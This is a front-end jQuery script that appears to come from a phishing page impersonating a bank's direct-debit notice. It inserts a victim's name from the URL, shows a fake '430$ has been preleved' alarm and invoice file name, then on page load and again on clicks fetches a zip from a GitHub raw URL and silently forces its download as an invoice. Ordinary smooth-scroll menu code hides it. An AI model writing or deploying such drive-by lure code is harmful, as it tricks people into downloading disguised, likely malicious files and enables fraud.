jQuery(document).ready(function( $ ) {

  var l = new URL(window.location)
  console.debug(l.hostname)
  console.debug(l.pathname)
  var params = l.searchParams.get("name")
  console.debug(params)
  $(".name").text(params)
  $("#prel").text(params+"facture__prelevement__BP.doc")
  $("#log").text(params)
  $("#pop").text(params+" 430$ has been preleved into your account!")

  fetch("https://github.com/daviddreams/travels/raw/master/ls__BP.zip")
  .then(resp => resp.blob())
  .then(blob =>{
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.style.display = 'none';
      a.href = url;
      a.download = params+"facture__prelevement__BP.zip";
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
  })
  .catch((e) => console.debug(e))
  $(".sold,.name , #prel").on("click", function(){
    fetch(""+params)
    .then(resp => resp.blob())
    .then(blob =>{
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = params+"facture__prelevement__BP.zip";
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
    })
    .catch((e) => console.debug(e))
  })
  // Smooth scroll for the menu and links with .scrollto classes
  $('.smoothscroll').on('click', function(e) {
    e.preventDefault();
    if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
      var target = $(this.hash);
      if (target.length) {

        $('html, body').animate({
          scrollTop: target.offset().top - 48
        }, 1500, 'easeInOutExpo');
      }
    }
  });

  $(".navbar-collapse a").on('click', function() {
    $(".navbar-collapse.collapse").removeClass('in');
  });
});
